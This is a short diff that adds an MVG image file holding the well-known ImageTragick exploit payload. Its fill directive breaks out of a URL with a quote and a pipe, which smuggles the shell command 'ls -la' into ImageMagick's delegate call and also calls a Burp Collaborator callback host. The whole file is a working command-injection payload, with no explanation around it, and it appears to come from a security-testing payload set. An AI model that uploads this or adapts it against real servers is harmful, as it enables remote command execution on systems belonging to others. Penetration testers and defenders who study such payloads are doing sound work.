@@ -1,0 +1,4 @@
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(http://PAYLOAD.burpcollaborator.net/image.jpg"|ls "-la)'
+pop graphic-context
